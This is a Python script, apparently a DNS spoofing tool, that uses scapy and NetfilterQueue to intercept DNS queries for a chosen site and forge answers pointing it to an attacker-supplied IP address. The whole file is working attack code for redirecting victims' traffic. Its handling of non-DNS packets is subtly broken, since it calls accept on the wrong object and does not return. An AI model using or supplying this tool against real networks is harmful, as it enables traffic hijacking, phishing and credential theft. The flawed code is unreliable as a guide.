#!/usr/bin/python3

from scapy.all import *
from netfilterqueue import NetfilterQueue
import argparse
import sys
import os

def callback(packet):
    ip_packet = IP(packet.get_payload())
    # for better throghput check if the packet is dns query
    if not ip_packet.haslayer(DNSQR):
        # accept packet and go to furthur processing
        ip_packet.accept()

    print(f"[*] Recive dns packet for site: {ip_packet[DNSQR].qname.decode()}")
    # check if the dns query contains our target site
    if splitted[0] in ip_packet[DNSQR].qname.decode():
        print("[*] We got dns packet for target site!!!!")
        # we hit the dns query that is about out target. going to change
                      # it's ip packet                                   # since it's dns packet, it must be sent over udp
        new_payload = IP(src=ip_packet[IP].src, dst=ip_packet[IP].dst) / UDP(sport=ip_packet[UDP].sport, dport=ip_packet[UDP].dport) /\
                        DNS(id=ip_packet[DNS].id, qr=1, aa=1, qd=ip_packet[DNS].qd, an=DNSRR(rrname=ip_packet[DNS].qd.qname, ttl=10, rdata=splitted[1]))
        
        # change packet payload
        packet.set_payload(bytes(new_payload))
        # accept packet and go to furthur processing
        packet.accept()
    else:
        # pass the packet. it's not what we want
        packet.accept()

parser = argparse.ArgumentParser()
parser.add_argument('--queue', required=True, type=int,
                    metavar='Netfilter Queue ID for binding')
parser.add_argument('--server', required=True, type=str,
                    metavar='website/to ip address')
args = parser.parse_args()
splitted = args.server.split('/')
nfqueue = NetfilterQueue()
nfqueue.bind(args.queue, callback)
nfqueue.run()

